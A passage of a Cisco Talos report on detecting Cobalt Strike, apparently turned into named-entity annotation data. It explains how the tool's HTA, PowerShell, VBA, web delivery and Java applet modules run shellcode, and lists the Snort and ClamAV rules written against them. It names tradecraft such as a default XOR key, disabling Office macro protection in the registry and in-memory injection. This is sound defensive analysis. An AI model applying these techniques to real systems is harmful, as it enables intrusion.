Since we confirmed these rules provide coverage, we can 
move onto the core stageless ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,".

The approach here was to once again find a unique set 
of instructions that can be associated with ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacons,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," while avoiding false positives. It was pretty difficult 
to find a good match in the stageless ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacons,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", but the 
function in Figure 19 sparked our interest.

This function is pretty simple — its purpose is to parse the 
DOS header and check for the correct file magic signature. 

Figure 18

Figure 19: A function 
inside a stageless ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,".



page 13 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

If it exists, it jumps to the IMAGE_NT_OPTIONAL header 
and checks the magic there.

After comparison, the AL byte is set to reflect the correct 
architecture. This is used for further processing of the 
file header. A quick run in ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," showed that this alerted 
on every single ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," we generated. This doesn’t look 
malicious on the surface, so researchers ran this function 
with multiple preceding NOPs through false-positive 
testing. Expectations were not high, but we couldn’t find a 
single false positive. This wasn’t the case prior to adding in 
the extra alignment bytes. Either NOP was less commonly 
used for alignment in modern compilers, or we were 
extremely lucky. Regardless, we had performed enough 
due diligence in testing to give the rule a shot.

The result was four rules that are still going strong to this day.

• 1:53656 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," x86 execut-
able download attempt

• 1:53657 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," x86 execut-
able download attempt

• 1:53658 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," x64 execut-
able download attempt

• 1:53659 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," x64 execut-
able download attempt

TARGET MODULE: HTML APPLICATION ATTACK 
GENERATOR

The focus of this attack generator is to generate an HTML 
Application (HTA), a file extension for the HTML executable 
file format and typically consists of HTML/Dynamic HTML 
and a scripting language of choice. HTA files behave like 
executables. They are popular among attackers because 
they run as a fully trusted application in certain cases.

When using the HTML Application Attack generator the user 
can select a ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," listener as usual and the method, 
including executable, ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, and ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,VBA,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,".

These methods do not determine the scripting language 
used in the HTA files. In all methods, VBScript is used to 
deliver the desired payload in the HTA file. The method, 
however, changes the payload type and how it is executed 
on the host. Let’s take a look at each of them.

Executable

The executable method (Figure 20) is a straightforward 

attack, as it is simply designed to load a large ASCII hex 
string and execute it on the host.

The shellcode is loaded by creating a `Scripting.
FileSystemOjbect` and using that to create a temporary 
file on the host. After initializing the temporary file, the 
shellcode stream is converted from hex string to bytes and 
written to the file (Figure 18).

Finally, the file is executed using a WScript.Shell object and 
the temporary file and folder are deleted to cover its tracks 
(Figure 21).

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

The ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," method is relatively naive at first glance, 
as it once again uses the WScript.Shell object to invoke 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". This time, rather than creating a temporary 
executable file, it simply runs ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,powershell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," with a large 
base64-encoded command (Figure 22).

We base64 decode the command, which results in a 
unicode string containing additional ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," and another 
base64 blob. Here, we can start to see the desired path to 

Figure 22

Figure 20

Figure 21



page 14 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

infection, as it takes the second base64 blob and is creating 
an `IO.MemoryStream` object out of it. A quick look at the 
resulting code shows that we, once again, jumped the gun 
in analysis and it’s gzip compressed.

We can quickly decompress the extracted data on the CLI 
(Figure 23).

The newly decoded payload declares some new functions.

• `func_get_proc_address()`

• `func_get_delegate_type()`

This is a fairly old technique (around 2012) that allows 
the user to invoke calls via .NET native method wrappers 
in ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,. This allows the user to call the ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Windows API,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," using and execute code in a fileless manner via the 
`System.Reflection` namespace.

We can then use`GetMethod()` to acquire a handle to the 
desired functionality and bypass any restrictions. The goal 
in this payload is to expose the `GetProcAddress` library 
function so that we can load the desired ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Windows API,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," code 
and interact with it.

System.Reflection exposes another function called 
`GetDeletegateForFunctionPointer`. Using this, ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," grabs a function pointer to any API function it needs 
for execution.

Once an executable section of memory is allocated and 

populated.. ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," can then execute the payload 
in memory through another delegate defined for the 
memory region.

So what is the base64 string this time? It’s shell code, but 
actually XOR encrypted (Figure 24).

This is pretty easy to decrypt. We know that it’s XOR’d using 
the key 0x23 (35) so we can decode this using our method of 
choice. In this case, we used `xortool-xor̀  (Figure 25)

Eventually, we determined that this is the same code as 
seen in the raw payload section in different packaging. 
Once ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," gets it right, it reuses that work across 
other attack options. This makes it more convenient for 
defenders to write detection.

Figure 23

Figure 24

Figure 25

https://docs.microsoft.com/en-us/dotnet/api/system.reflection


page 15 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,VBA,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

The ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,VBA,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," Method gives a little bit of a different approach 
(Figure 26).

So far, we’ve seen basic methods of loading binary code 
and executing it. In this method, we can see that it uses an 
Excel Workbook to execute additional code. The first thing 
that happens is ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," loads up an `Excel.Application` 
and then queries a registry key:

`HKEY_CURRENT_USER\Software\Microsoft\
Office\",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"\Excel\Security\AccessVBOM\̀

This key is a security setting for restricting default 
programmatic access to the Office VB project. If it’s 
enabled, Office will trust all macros and run any code 
without a security warning or additional permissions from 
the user. ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," attempts to flip that switch and 

disable this protection in the registry.

After that, ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, once again calls the ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Windows API,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
to execute binary code. Then, it allocates an executable 
section of memory within the process and runs it by calling 
`kernel32.dll!CreateRemoteThread`.

Detection

This type of multilayer obfuscation is easy to extract when 
in hand but can be extremely effective against security 
products that don’t know it’s coming. But it’s possible to 
work around this.

For the executable method, the shellcode was actually the 
same assembly code as what we discussed earlier in the 
Staged/Stageless Executables. The NOP-based function is 
interpreted as a hex string, so we can clone those rules to 

Figure 26



page 16 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

match a hex string, rather than actual bytes.

• 1:54110 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
HTML ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," download attempt

• 1:54111 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
HTML ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," download attempt

• 1:54112 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
HTML ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," download attempt

• 1:54113 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
HTML ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," download attempt

For the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," method, we have again a ton of 
obfuscated code underneath it, so the coverage should 
target generic function calls. For this, we went with the 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," command arguments, and supplemented that 
with matching on a Wscript.Shell object being created.

• 1:54114 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,powershell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload download attempt

• 1:54115 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,powershell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload download attempt

Lastly, we have the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,VBA,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," Method. Our researchers found 
this easy to cover because HTA files don’t often interface 
with Excel workbooks, let alone one that tinkers with the 
“AccessVBOM” registry key.

• 1:54116 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,VBA,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload download attempt

• 1:54117 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,VBA,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload download attempt

From there, we cloned all that to ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ClamAV,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," coverage to get 
the following signatures:

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"-7932561-0

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"-7932562-0

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"-7932563-0

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"-7932564-0

TARGET MODULE: SCRIPTED WEB DELIVERY

In ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", there’s a feature called “scripted web 
delivery.” Executing a scripted web delivery attack simply 
means that you pick one of the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payloads/
listeners and ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," will then host that payload at 
a user-configured URI. These can be generated in three 
different languages: ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Bitsadmin,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, and ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Python,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,".

After hosting the payload, ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," provides a 

command that can be executed, in the language of choice, 
that reaches out and grabs the malicious payload from an 
attacker-controlled web server and executes it.

We are only going to concentrate on the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
implementation, as it is the most commonly used module. 
The initial execution is using a web client to download an 
additional ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload from the attacker controlled 
web server and then continue to execute that code.

Payload

After reaching out to grab the real payload, we get a huge 
obfuscated ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," script from the web server, almost 
200KB in size.

This script contained code reuse from the HTA module, 
but we still needed to go one layer deeper and verify the 
shellcode was unique in this module. We base64-decode 
the data and decrypt it using the same `0x23` default 
XOR key — and it’s already much larger than the previous 
payload.

It’s not raw shellcode like we saw in the HTA payloads, 
you can immediately see that the “MZ” header is present. 
This seems to be a stageless ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," included in the 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," script. You might wonder why it wasn’t 
included in the HTA attack. The reason is the HTA module 
is executing a ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," one-liner and Windows has 
a character limit on command line strings, 32767. That 
number is even lower when executing a command from 
`cmd.exe`, 8191. The character limit varies across a variety 
of execution methods and these numbers are not always 
going to be correct.

Since this payload is downloaded using a small one-liner to 
execute a string retrieved from the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," controlled 
server, that limit is bypassed and a more reliable payload 
can be provided.

Detection

To detect something, we first have to narrow down what 
we can actually see in ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, or ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ClamAV,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". We are not able 
to deobfuscate a ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," script coming across the 
network prior to detection — it’s simply not feasible without 
introducing latency for the client in most cases.

So, for detection, we are left with the initial obfuscated 
payload downloaded. That’s not so bad because ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", in its current configuration, once again has a 



page 17 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

static format when generating the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," script. 
We know that in this instance, the code `New-Object 
IO.MemoryStream(,[Convert]:: FromBase64String(` following 
will always be present in a position relatively close to the 
start of the file.

This gives us simple, but efficient, coverage using

• 1:53973 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
web delivery attempt

• 1:53974 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
web delivery attempt

TARGET MODULE: SIGNED ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JAVA APPLET ATTACK,technique
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

The applets in this attack are self-signed, giving users 
limited options: a listener (per usual), port, local host and 
the URI it’s hosted on. This will spawn a hosted ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," Applet 
on a malicious ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," web server to infect users. If a 
user gives an applet permission to run, infection will occur.

Landing Page

Upon visiting the page, the user sees a generic landing 
page that loads a malicious JAR file, “",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,cross_platformi9.jar,ioc
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"” 
and applet class loaded is defined by the “code” parameter, 
“Java.class” (Figure 27).

The first thing that catches the eye is that two parameters 
are passed — “id,” which contains a large base64 blob, and 
“type” which is set to “theme.” We can confirm this right off 
the bat by comparing the length of the raw HTTP ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
payload against the length of the decoded binary blob, both 
a total of 799 bytes.

A second HTTP GET request is made for the JAR file during 
the process of loading this applet. So that’s the next step.

Java archive (JAR)

First, we’ll look at the JAR file (Figure 28).

We have a few classes, and two DLLs named “main.dll” 
and “main64.dll”. You can also see the default signature file 

Figure 27

Figure 28



page 18 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

(MYKEY.SF) and RSA certificate (MYKEY.RSA) used to sign 
the binary. Figure 29 shows us jusing jadx to decompile the 
source code.

The base code called “Java.class” isn’t complicated — it’s 
an extension of “Applet” designed to spawn a thread. And 
the Base64.dll class isn’t malicious, it handles base64 as 
expected.

“Main.class” is fairly basic but shows us that a temporary 
file is created, named “main.dll” and writes data to that 
file from either the main64.dll or main.dll file contained in 
the JAR file based on the system architecture. The system 
property “sun.arch.data.model” is a simple method to return 
the system’s word size, easily determining the architecture. 
Following this, the new DLL file path is fed to `System.
load()`.

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, uses the ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java Native Interface,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, (,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JNI,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,") to perform 
injection. This is essentially the same as creating bindings 
to another program. It allows users to load a library into the 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java Virtual Machine,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, (,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JVM,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,") and interact with it.

Main.dll

Since inject() is called from the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JNI,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," with the shellcode blob, 
we can load this into IDA and see an exposed function — 
J̀ava_Main_inject()`.

The handoff to J̀ava_Main_inject` isn’t as straightforward as 
it would be passing a byte/character array in ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,C/C++,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". In this 
case the exported function looks a little like Figure 30:

The data is extracted from the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JNI,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," objects and then passed 
to the real `inject()` function that spawns a new thread and 
resumes execution in the shellcode passed in from the “id” 
parameter.

Detection

We need to isolate the things we want to cover and 
separate them from each other when evaluating multiple 

levels of execution. Here, we can identify a few things.

1. The landing page that spawns the malicious applet

2. The JAR file

3. main.dll/main64.dll

The landing page was fairly simple, as we already identified 
that the parameter is simply the raw payload from earlier. 
The JAR files contain the same DLL 32/64 bit and code 
every time but have a different name. This simplifies things 
as we target what we know is malicious in there.

The last thing was the extracted DLL, and our prior work 
paid off. We had prior coverage available from various x32/
x64 download rules we created researching the staged/
stageless beacons.

TARGET MODULE: SMART JAVA APPLET ATTACK

The Smart Java Applet Attack is very similar to Signed Applets 
in execution. Instead of just running raw shell code, though, it 
attempts to gain execution through various Java exploits. It is 
deemed “Smart” as it determines what exploit to use based 
on the version of Java the victim host is running.

Landing Page

The landing page is for the most part the same as Signed 
Applet Attacks. It spawns a malicious page on the default 
URI, “/SiteLoader.”

Once again, there’s a base64 blob containing the “id” 

Figure 29

Figure 30



page 19 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

parameter and a “type” parameter 
with the value “os.” The payload is 
slightly different, however, since it 
uses the same shellcode stub. We 
already know what this does for 
the most part, so we’ll skip further 
analysis.

Java Archive

Per the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," official 
documentation, we can get a brief 
understanding of this module’s goal.

• The smart applet analyzes its 
environment and decides which 
Java exploit to use. If the Java 
version is vulnerable, the applet 
will disable the security sandbox, 
and spawn a session using ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"’s Java injector.

• These exploits in this attack work 
against Java 1.7u21 and older. 
Java 1.6u45 and older is also 
vulnerable to this attack.

The exploits used are not specified 
however, we know it affects the Java 
versions shown in Figure 31. Since 
we don’t know what exploits it’s 
using already, we must look closer.

There are a lot more classes shown 
in Figure 32, but we can see that 
main.dll/main64.dll are still included. 
A quick `sha256sum` reveals that 
these are the same DLLs included 
in the Signed Applet Attack module. 
We once again can decompile the jar 
using `jadx` as we did in the Signed 
Applet Attack. The decompilation 
was not clean as we receive one 
error for an unknown instruction, 
“invoke-polymorphic”. This 
instruction is not currently supported 
in jadx, so we will just ignore it for 
now and start looking at J̀avaApplet.
class` in Figure 31.

This class directs execution based on 

Figure 31

Figure 32

the version of Java installed, here we can identify how it targets each version. The 
code polls “java.version” via a call to System.getProperty to get the JRE version 
installed, if any. Following that it is matched against the PCRE `1.(\d+).0_(\d+)`. The 
important thing with this PCRE is that it has two capture groups that retrieve major 
